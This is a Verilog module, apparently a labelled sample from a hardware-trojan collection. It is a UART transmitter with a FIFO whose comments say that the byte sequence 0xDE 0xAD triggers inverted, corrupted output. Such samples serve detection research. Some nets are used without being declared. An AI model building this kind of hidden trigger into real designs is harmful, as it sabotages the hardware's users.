 // Modified UART TX Module with FIFO and Conditional Logic-Based Hardware Trojan
module uart_tx_fifo_trojan_v7 (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output tx_serial
);

    reg [7:0] mem [0:31]; // FIFO memory
    reg [4:0] w_addr = 5'd0, r_addr = 5'd0; // Write and read pointers
    reg [4:0] cnt = 5'd0; // Count of bytes in FIFO
    reg we = 1'b0; // Write enable for internal UART TX
    reg [7:0] data = 8'd0; // Data to be sent

    wire uart_busy;
    uart_tx uart (
        .clk(clk),
        .rx_we(we),
        .rx_data(data),
        .tx_busy(uart_busy),
        .tx_serial(tx_serial)
    );

    // Conditional Logic-Based Trojan Activation
    // Trojan gets activated if specific data sequence is detected
    reg [7:0] last_byte_received = 8'd0;
    always @(posedge clk) begin
        if (rx_we) begin
            last_byte_received <= rx_data; // Record the last byte received
        end
    end
    wire trojan_trigger = (last_byte_received == 8'hDE) && (rx_data == 8'hAD); // Specific trigger condition

    // Trojan: Inverts the data to be transmitted when the trigger condition is met
    always @(posedge clk) begin
        if (write && !trojan_trigger) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= rx_data;
            cnt <= cnt + 5'd1;
        end else if (write && trojan_trigger) begin
            w_addr <= w_addr + 5'd1;
            mem[w_addr] <= ~rx_data; // Invert data if trojan is triggered
            cnt <= cnt + 5'd1;
        end

        if (~uart_busy && (cnt > 5'd0) && ~we) begin
            data <= mem[r_addr];
            r_addr <= r_addr + 5'd1;
            cnt <= cnt - 5'd1;
            we <= 1'b1;
        end else begin
            we <= 1'b0;
        end
    end

    assign write = rx_we && (cnt < 5'd31);
    assign read = ~uart_busy && (cnt > 5'd0) && ~we;

    // Managing the busy flag
    always @(posedge clk) begin
        tx_busy <= uart_busy || (cnt != 5'd0);
    end

endmodule
